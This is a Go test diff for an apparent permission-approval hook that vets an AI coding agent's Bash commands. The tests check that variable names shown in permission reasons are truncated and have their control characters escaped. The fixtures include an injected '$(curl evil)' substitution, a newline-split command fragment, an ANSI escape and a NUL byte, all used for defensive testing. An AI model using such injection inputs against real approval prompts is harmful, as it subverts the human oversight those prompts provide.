@@ -5,6 +5,7 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
 	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
 )
 
@@ -239,6 +240,58 @@ func TestEnvVars_WidenedSafeSubstitution_NoUnclassifiableReason(t *testing.T) {
 	}
 	if strings.Contains(got.Reason, "unclassifiable expression") {
 		t.Errorf("cmd %q: got Reason %q, want no unclassifiable-expression reason (git rev-parse is now a safe substitution)", "FOO=$(git rev-parse HEAD) make", got.Reason)
+	}
+}
+
+// TestSanitizeReasonName pins the reason-hygiene contract (pg2-3ggxm layer 3):
+// a variable NAME embedded in a user-facing permissionDecisionReason is bounded in
+// length and has its control characters escaped. An ordinary name must pass through
+// untouched so the existing reasons read exactly as before.
+func TestSanitizeReasonName(t *testing.T) {
+	tests := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"ordinary name unchanged", "LD_PRELOAD", "LD_PRELOAD"},
+		{"lowercase unchanged", "foo_1", "foo_1"},
+		{"newline escaped", "length')\nkv", `length')\nkv`},
+		{"carriage return and tab escaped", "a\rb\tc", `a\rb\tc`},
+		{"nul escaped", "a\x00b", `a\u0000b`},
+		{"ansi escape neutralized", "a\x1b[31mb", `a\u001b[31mb`},
+		{"over-long name truncated", strings.Repeat("x", 200), strings.Repeat("x", maxReasonNameLen) + "..."},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if got := sanitizeReasonName(tt.in); got != tt.want {
+				t.Errorf("sanitizeReasonName(%q) = %q, want %q", tt.in, got, tt.want)
+			}
+		})
+	}
+}
+
+// TestEnvVars_ReasonNeverLeaksCommandFragment asserts the rule's own reason string
+// is safe even when handed the exact adversarial name the pg2-3ggxm parser desync
+// used to produce: a multi-line command fragment. The live hook emitted that
+// fragment — embedded newline and all — verbatim into permissionDecisionReason.
+func TestEnvVars_ReasonNeverLeaksCommandFragment(t *testing.T) {
+	r := New()
+	fragment := "length')\nkv=$(env -u BEADS_DIR -u WORKSPACE_ROOT bd show gc-6kv --json 2>/dev/null | jq -r 'if"
+	got := r.evaluateAssignment(cmdparse.EnvAssignment{
+		Name:      fragment,
+		Value:     "$(curl evil)",
+		Raw:       fragment + "=$(curl evil)",
+		Expansion: cmdparse.ExpansionUnknown,
+	}, &hookio.HookInput{ToolName: "Bash"})
+
+	if strings.ContainsAny(got.Reason, "\n\r\t\x00") {
+		t.Errorf("Reason %q contains a raw control character; it is rendered into a user-facing prompt", got.Reason)
+	}
+	if strings.Contains(got.Reason, fragment) {
+		t.Errorf("Reason %q echoes the command fragment verbatim", got.Reason)
+	}
+	if len(got.Reason) > 160 {
+		t.Errorf("Reason is %d bytes; want a bounded reason (<=160)", len(got.Reason))
 	}
 }
 
